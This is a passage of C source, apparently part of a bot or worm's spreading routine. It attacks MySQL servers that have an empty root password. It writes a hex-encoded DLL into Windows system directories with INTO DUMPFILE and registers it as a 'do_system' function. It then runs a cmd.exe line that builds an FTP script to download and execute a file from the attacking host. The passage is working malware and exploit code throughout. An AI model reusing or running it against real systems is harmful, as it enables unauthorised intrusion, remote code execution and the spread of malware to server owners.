"696D705F5F66666C757368005F5F5F7733325F7368617265647074725F756E65"
"78706563746564005F5F696D705F5F66726565005F5F6D616A6F725F696D6167"
"655F76657273696F6E5F5F005F5F6C6F616465725F666C6167735F5F005F5F69"
"6D705F5F41646441746F6D414034005F5F686561645F6C69626B65726E656C33"
"325F61005F5F6D696E6F725F73756273797374656D5F76657273696F6E5F5F00"
"5F5F6D696E6F725F696D6167655F76657273696F6E5F5F005F46696E6441746F"
"6D414034005F47657441746F6D4E616D6541403132005F5F52554E54494D455F"
"50534555444F5F52454C4F435F4C4953545F454E445F5F005F5F6C69626B6572"
"6E656C33325F615F696E616D6500"
");";

char dump_to_fileX0[] = "SELECT * FROM clown INTO DUMPFILE 'c:/clown.dll';";
char dump_to_fileX1[] = "SELECT * FROM clown INTO DUMPFILE 'c:/windows/system32/clown.dll';";
char dump_to_fileX2[] = "SELECT * FROM clown INTO DUMPFILE 'c:/winnt/system32/clown.dll';";
char dump_to_fileX3[] = "SELECT * FROM clown INTO DUMPFILE 'e:/windows/system32/clown.dll';";
char dump_to_fileX4[] = "SELECT * FROM clown INTO DUMPFILE 'e:/winnt/system32/clown.dll';";
char dump_to_fileX5[] = "SELECT * FROM clown INTO DUMPFILE 'f:/windows/system32/clown.dll';";
char dump_to_fileX6[] = "SELECT * FROM clown INTO DUMPFILE 'f:/winnt/system32/clown.dll';";
char dump_to_fileX7[] = "SELECT * FROM clown INTO DUMPFILE 'g:/windows/system32/clown.dll';";
char dump_to_fileX8[] = "SELECT * FROM clown INTO DUMPFILE 'g:/winnt/system32/clown.dll';";
char dump_to_fileX9[] = "SELECT * FROM clown INTO DUMPFILE 'h:/windows/system32/clown.dll';";
char dump_to_fileXA[] = "SELECT * FROM clown INTO DUMPFILE 'h:/winnt/system32/clown.dll';";


char create_function[] = "CREATE FUNCTION do_system RETURNS integer SONAME 'clown.dll';";

char create_functionY1[] = "CREATE FUNCTION do_system RETURNS integer SONAME 'c:/clown.dll';";
char create_functionX1[] = "CREATE FUNCTION do_system RETURNS integer SONAME 'c:/windows/system32/clown.dll';";
char create_functionX2[] = "CREATE FUNCTION do_system RETURNS integer SONAME 'c:/winnt/system32/clown.dll';";

char execute_cmd[4000];

MYSQL mysqlDataD;
MYSQL * mysqlData = &mysqlDataD;

char *spHost=exinfo.ip; 
char *spUser="root"; 
char *spPassword=NULL; 
int spPort=3306; 


_snprintf(execute_cmd, sizeof(execute_cmd)-1,"SELECT do_system(\"cmd.exe /c echo open %s %d > o&echo user 1 1 >> o &echo get %s >> o &echo quit >> o &ftp -n -s:o &del /F /Q o &%s\");", 
		  GetIP(exinfo.sock),FTP_PORT, filename, filename);

mysql_init (mysqlData);

if (! mysql_real_connect (mysqlData, spHost, spUser, spPassword, "mysql", spPort, NULL, 0) )
{
return -1;
} 

mysql_query (mysqlData, rem_table);
mysql_query (mysqlData, create_table);
mysql_query (mysqlData, do_system);


mysql_query (mysqlData, dump_to_fileX0);
mysql_query (mysqlData, dump_to_fileX1);
mysql_query (mysqlData, dump_to_fileX2);
mysql_query (mysqlData, dump_to_fileX3);
mysql_query (mysqlData, dump_to_fileX4);
mysql_query (mysqlData, dump_to_fileX0);
mysql_query (mysqlData, dump_to_fileX6);
mysql_query (mysqlData, dump_to_fileX7);
mysql_query (mysqlData, dump_to_fileX8);
mysql_query (mysqlData, dump_to_fileX9);
mysql_query (mysqlData, dump_to_fileXA);

mysql_query (mysqlData, create_function);
mysql_query (mysqlData, execute_cmd);

mysql_query (mysqlData, rem_table);

return 1;
} 


